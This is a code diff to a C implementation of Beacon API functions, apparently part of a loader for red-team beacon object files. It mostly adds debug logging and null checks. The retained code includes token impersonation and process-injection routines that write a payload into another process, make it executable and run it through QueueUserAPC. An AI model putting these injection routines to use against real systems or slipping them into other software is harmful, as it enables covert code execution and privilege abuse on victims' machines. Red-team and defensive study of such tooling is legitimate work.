@@ -287,35 +287,35 @@ void BeaconOutput(int type, char* data, int len) {
     return;
 }
 
-/* Token Functions */
-
+/* 
+ * Beacon Token Functions
+ */
 BOOL BeaconUseToken(HANDLE token) {
+    _dbg("[BAPI] Called  BeaconUseToken");
     /* Probably needs to handle DuplicateTokenEx too */
     SetThreadToken(NULL, token);
     return TRUE;
 }
 
 void BeaconRevertToken(void) {
+    _dbg("[BAPI] Called  BeaconRevertToken");
     if (!RevertToSelf()) {
-#ifdef DEBUG
-        printf("RevertToSelf Failed!\n");
-#endif
+        _err("\t Failed to revert token identity.");
     }
     return;
 }
 
 BOOL BeaconIsAdmin(void) {
-    /* Leaving this to be implemented by people needing it */
-#ifdef DEBUG
-    printf("BeaconIsAdmin Called\n");
-#endif
-    return FALSE;
+    _dbg("[BAPI] Called BeaconIsAdmin ");
+    return IdentityIsAdmin();
 }
 
 /* Injection/spawning related stuffs
  *
  */
 void BeaconGetSpawnTo(BOOL x86, char* buffer, int length) {
+    _dbg("[BAPI] Called BeaconGetSpawnTo ");
+
 	CHAR tempBufferPath [MAX_PATH * 2];
 
     if (buffer == NULL) {
@@ -339,6 +339,9 @@ void BeaconGetSpawnTo(BOOL x86, char* buffer, int length) {
 
 
 BOOL BeaconSpawnTemporaryProcess(BOOL x86, BOOL ignoreToken, STARTUPINFO* sInfo, PROCESS_INFORMATION* pInfo) {
+    _dbg("[BAPI] Called BeaconSpawnTemporaryProcess ");
+
+    
     BOOL bSuccess = FALSE;
     CHAR lpPath   [MAX_PATH * 2];
     WCHAR lpPathW [MAX_PATH * 2];
@@ -406,6 +409,8 @@ BOOL BeaconSpawnTemporaryProcess(BOOL x86, BOOL ignoreToken, STARTUPINFO* sInfo,
 
 
 void BeaconInjectProcess(HANDLE hProc, int pid, char* payload, int p_len, int p_offset, char* arg, int a_len) {
+    _dbg("[BAPI] Called BeaconInjectProcess ");
+
     /* Basic explicit process injection (CreateRemoteThread) */
     LPVOID remoteBuf = NULL;
     HANDLE hThread   = NULL;
@@ -454,6 +459,8 @@ void BeaconInjectProcess(HANDLE hProc, int pid, char* payload, int p_len, int p_
 
 // Placeholder injection technique for Beacon API
 void BeaconInjectTemporaryProcess(PROCESS_INFORMATION* pInfo, char* payload, int p_len, int p_offset, char* arg, int a_len) {
+    _dbg("[BAPI] Called BeaconInjectTemporaryProcess ");
+
     /* Basic spawn process injection (QueueUserAPC) */
     HANDLE hProc                    = pInfo->hProcess;
     HANDLE hThread                  = pInfo->hThread;
@@ -471,19 +478,19 @@ void BeaconInjectTemporaryProcess(PROCESS_INFORMATION* pInfo, char* payload, int
 
     // Write
 	if (!WriteProcessMemory(hProc, (LPVOID)pAddress, (LPCVOID)payload, (SIZE_T)p_len, &szNumberOfBytesWritten) || szNumberOfBytesWritten != p_len) {
-		_dbg("[!] Failed to write process memory : %d\n", GetLastError());
+		_dbg("\t[!] Failed to write process memory : %d\n", GetLastError());
 		return;
 	}
 
     // Memory page executable (RX)
     if (!VirtualProtectEx(hProc, pAddress, p_len, PAGE_EXECUTE_READ, &dwOldProtection)) {
-		_dbg("[!] VirtualProtect Failed With Error : %d\n", GetLastError());
+		_dbg("\t[!] VirtualProtect Failed With Error : %d\n", GetLastError());
 		return;
 	}
 
     // Queue APC in existing thread
     if (!QueueUserAPC((PAPCFUNC)pAddress, hThread, NULL)) {
-		_dbg("[!] QueueUserAPC Failed With Error : %d \n", GetLastError());
+		_dbg("\t[!] QueueUserAPC Failed With Error : %d \n", GetLastError());
 		return;
 	}
 
@@ -499,8 +506,12 @@ void BeaconInjectTemporaryProcess(PROCESS_INFORMATION* pInfo, char* payload, int
 /* --------------------------------------------------------------------------------------------------------------------------------------------------------- */
 
 void BeaconCleanupProcess(PROCESS_INFORMATION* pInfo) {
-    (void)CloseHandle(pInfo->hThread);
-    (void)CloseHandle(pInfo->hProcess);
+    if (pInfo != NULL && pInfo->hThread != NULL) {
+        CloseHandle(pInfo->hThread);
+    }
+    if (pInfo != NULL && pInfo->hProcess != NULL) {
+        CloseHandle(pInfo->hProcess);
+    }
     return;
 }
 
